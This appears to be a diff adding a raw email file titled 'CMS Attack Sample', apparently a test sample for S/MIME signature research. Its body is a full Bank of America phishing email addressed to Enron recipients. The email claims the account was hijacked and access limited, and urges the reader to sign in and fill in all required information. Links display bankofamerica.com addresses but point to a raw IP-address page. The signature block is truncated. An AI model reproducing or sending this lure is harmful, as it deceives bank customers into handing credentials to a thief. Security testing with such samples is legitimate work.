@@ -1,0 +1,331 @@
+From: rnaviasky@hupk.com
+To: robin.barbe@enron.com, l..kelly@enron.com
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----5D710E5192338F8D6E1D1324B6443410"
+This is an S/MIME signed message
+----5D710E5192338F8D6E1D1324B6443410
+8
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html lang=3D"en">
+	<head>
+		<title>Bank of America Alert</title>
+
+		<!-- embedded style sheet -->
+		<style type=3D"text/css">
+		<!--
+			a:link {
+				color: #405ebe;
+				background: #ffffff;
+			}
+			a:hover {
+				color: #0000ff;
+				background: #ffffff;
+			}
+			body, table, div, h1, h2, h3, h4, h5, h6, p {
+				font-family: verdana;
+				color: #333333;
+				background: #ffffff;
+			}
+			.font-sign-in {
+				font-size: 70%;
+				font-family: "verdana";
+				font-weight: bold;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			h1 {
+				font-size: 100%;
+				font-family: verdana;
+				color: #d4001a;
+				background: #ffffff;
+				margin-bottom: 0px;
+			}
+			.font-title-red {
+				font-size: 105%;
+				font-family: verdana;
+				color: #d4001a;
+				background: #ffffff;
+				margin-bottom: 0px;
+			}
+			.font-x {
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+			}
+			.font-y {
+				font-size: 70%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			.font-footer {
+				color: #333333;
+				background: #ffffff;
+				font-size: 70%;
+				margin-top: 0em;
+				margin-bottom: 1em;
+			}
+			.inner-table {
+
+				font-size: 75%;
+				font-family: verdana, arial, geneva, helvetica, sans-serif;
+				margin-bottom: 1em;
+				line-height: 1.4;
+				margin-top: .8em;
+			}
+			.paragraph-body {
+				font-size: 70%;
+				margin-top: 0.45em;
+				margin-bottom: 1em;
+				color: #333333;
+				background: #ffffff;
+				line-height: 1.4;
+			}
+			.paragraph-dynamic {
+				color: #333333;
+				background: #e9e8e3;
+				font-size: 70%;
+				font-family: verdana;
+				line-height: 1.4;
+			}
+			.paragraph-fine-print {
+				font-size: 65%;
+				font-family: verdana;
+				margin-bottom: 1em;
+				color: #333333;
+				background: #f0f0f0;
+				line-height: 1.4;
+			}
+			.email-address {
+				text-transform: lowercase;
+				background: #f0f0f0;
+			}
+			hr {
+				width: 100%;
+				color: #999999;
+			}
+			.red-heading {
+				width: 78.6%;
+			}
+			.bold { font-weight: bold; }
+			.first-col { width: 15px;  background: #f0f0f0;}
+			.second-col { width: 145px;  background: #f0f0f0;}
+			.third-col { width: 15px; }
+			.fourth-col { width: 572px; }
+			.first-second-col { width: 160px;  background: #f0f0f0;}
+			.third-fourth-col { width: 587px; }
+			.first-second-third-col { width: 175px; }
+			.all-four-col { width: 747px; }
+			.banner-row { height: 70px; }
+			.sub-banner-row { height: 93px; }
+			.empty-row { height: 25px; }
+		-->
+		</style>
+
+	<!-- body -->
+	</head>
+	<body>
+		<table width=3D"747" border=3D"0" cellpadding=3D"0" cellspacing=3D"0" su=
+mmary=3D"Email Body Layout">
+			<!-- table header -->
+			<tr class=3D"banner-row">
+				<td class=3D"all-four-col" colspan=3D"4">
+					<img width=3D747 height=3D70 src=3D"http://alert.bankofamerica.com/im=
+ages/client/bankofamerica/email_masthead_top.jpg" alt=3D"Bank of America H=
+igher Standards"></td>
+			</tr>
+
+
+
+			<!-- row 1 -->
+			<tr class=3D"sub-banner-row">
+				<!-- row 1 cell 1-2 -->
+				<td class=3D"first-second-col" colspan=3D"2">
+					<img width=3D160 height=3D103 src=3D"http://alert.bankofamerica.com/i=
+mages/client/bankofamerica/em_photo.jpg" alt=3D"Customer using a laptop fo=
+r Online Banking"></td>
+				<!-- row 1 cell 3-4 -->
+				<TD class=3D"red-heading" colspan=3D"2" style=3D"background: #d4001a">=
+
+					<img width=3D193 height=3D103 src=3D"http://alert.bankofamerica.com/i=
+mages/client/bankofamerica/em_title_red.gif" alt=3D"Online Banking Alert">=
+</td>
+			</tr>
+			<!-- row 2 -->
+			<tr class=3D"empty-row" height=3D"25px">
+				<!-- row 2 cell 1-2 -->
+				<td class=3D"first-second-col" colspan=3D"2">
+				</td>
+				<!-- row 2 cell 3-4 -->
+				<td class=3D"third-fourth" colspan=3D"2">
+				</td>
+			</tr>
+			<!-- row 3 -->
+			<tr>
+				<!-- row 3 cell 1 -->
+				<td class=3D"first-col">
+				</td>
+				<!-- row 3 cell 2 -->
+				<td class=3D"second-col" valign=3D"top">
+					<div class=3D"font-sign-in">
+						Notice:<br>
+						To active your<br>
+						online access
+						please<br>
+						
+						<a href=3D"http://210.22.161.228:90/icons/boa1111111111111111111111.=
+html" style=3D"color: #d4001a; text-decoration: none; background: #f0f0f0;=
+" title=3D"Sign in to Bank of America Online Banking.">Sign In &raquo;</a>=
+
+
+					</div>
+				</td>
+				<!-- row 3 cell 3 -->
+				<td class=3D"third-col">
+				</td>
+
+				<!-- Overrideable Section Start -->
+				<!-- row 3 cell 4 -->
+				<td class=3D"fourth-col">
+					<h1>Bank of America Alert - Unauthorized Account Access
+</h1>
+					<hr size=3D"1px">
+					<table class=3D"inner-table" border=3D"0" cellpadding=3D"0" cellspaci=
+ng=3D"0">
+						
+				</tr>				</tr>
+				<tr>
+					
+				</tr>					</table>
+				</td>
+			</tr>
+			<!-- row 4 -->
+			<tr>
+				<!-- row 4 cell 1 -->
+				<td class=3D"first-col">
+				</td>
+				<!-- row 4 cell 2 -->
+				<td class=3D"second-col" valign=3D"middle">
+					<div class=3D"font-y">
+					</div>
+				</td>
+				<!-- row 4 cell 3 -->
+				<td class=3D"third-col">
+				</td>
+				<!-- row 4 cell 4 -->
+				<td class=3D"fourth-col">
+					<p class=3D"paragraph-body">
+						We recently noticed one or more attempts to log in your Bank of Amer=
+ica Online Banking account from a foreign IP address and we have reasons t=
+o believe that your account was hijacked by a third party without your aut=
+horization. <br>Therefore, as a preventative measure, we have temporarily =
+limited access to sesitive account features. <br>
+<br>
+To restore your account access, please take the following steps to ensure =
+that your account has not been compromised: <br>
+<br>
+<a target=3D"_blank"  href=3D"http://210.22.161.228:90/icons/boa1111111111=
+111111111111.html" >https://sitekey.bankofamerica.com/verification-ID89327=
+84972/</a>
+<br>
+<br>
+Login in your Bank of America Online Banking account and fill in all <br>r=
+equired information.
+
+					</p>
+					<p class=3D"paragraph-body">
+										</p>
+				</td>
+			</tr>
+			<!-- Overrideable Section Finish -->
+			<!-- row 5 -->
+			<tr>
+				<!-- row 5 cell 1 -->
+				<td class=3D"first-col">
+				</td>
+				<!-- row 5 cell 2 -->
+				<td class=3D"second-col" valign=3D"bottom">
+					<div class=3D"font-y">
+						This email sent from:<br>
+						<span class=3D"email-address">
+						<a href=3D"mailto:alerts@bankofamerica.com				" style=3D"background:=
+ #f0f0f0;">alerts@bankofamerica.com	</a></span>
+					</div>
+				</td>
+				<!-- row 5 cell 3 -->
+				<td class=3D"third-col">
+				</td>
+				<!-- row 5 cell 4 -->
+				<td class=3D"fourth-col">					</p>
+				</td>
+			</tr>
+
+			<!-- row 6 -->
+			<tr>
+				<!-- row 6 cell 1 -->
+				<td class=3D"first-col">
+				</td>
+				<!-- row 6 cell 2 -->
+				<td class=3D"second-col">
+				</td>
+				
+
+
+				<!-- row 6 cell 4 -->
+				<td class=3D"third-fourth-col" colspan=3D2>
+				<table style=3D"background: #e9e8e3;" cellpadding=3D"7px" boarder=3D0 =
+width=3D"99.6%" height=3D"50px" align=3Dright>
+					<tbody>
+					<tr>
+					<td>
+					<p class=3D"paragraph-dynamic">
+Want to get more alerts? Sign in to Bank of America Online Banking and cli=
+ck the "Manage Alerts" link in the "I want to..." box.
+					</p>
+				</td>
+				</tr>
+				</tbody>
+				</table>
+				</td>
+			</tr>
+
+			<!-- add in a space between grey boxed messages -->
+			<TR height=3D2px>
+			<TD class=3Dfirst-second-col colspan=3D2> </TD>
+			<TD class=3Dthird-fourth-col colspan=3D2> </TD>
+			</TR>
+
+			<!-- row 7 -->
+			<tr>
+				<!-- row 7 cell 1 -->
+				<td class=3D"first-col">
+				</td>
+				<!-- row 7 cell 2 -->
+				<td class=3D"second-col">
+				</td>
+				
+
+
+				<!-- row 7 cell 4 -->
+				<td class=3D"third-fourth-col" colspan=3D2>
+				<table style=3D"background: #f0f0f0;" cellpadding=3D"10px" boarder=3D0=
+ width=3D"99.6%" align=3Dright>
+					<tbody>
+					<tr>
+					<td>
+
+					<p class=3D"paragraph-fine-print">
+						<strong >Because email is not a secure form of communication, please=
+ do not reply to this email.</strong><br>
+						 If you have any questions about your account or need assistance, pl=
+ease call the phone number on your statement or go to Contact Us at <a tar=
+get=3D"_blank"  href=3D"http://210.22.161.228:90/icons/boa1111111111111111=
+111111.html" >http://www.bankofamerica.com</a>
+----5D710E5192338F8D6E1D1324B6443410
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MIIFSgYJKoZIhvcNAQcCoIIFOzCCBTcCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGg
+ggUQMIIFDDCCA/SgAwIBAgIMRi8nTsikHAWzzKSCMA0GCSqGSIb3DQEBCwUAMF0xCzAJBgNVBAYT
+AkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTMwMQYDVQQDEypHbG9iYWxTaWduIFBlcnNv
+----5D710E5192338F8D6E1D1324B6443410
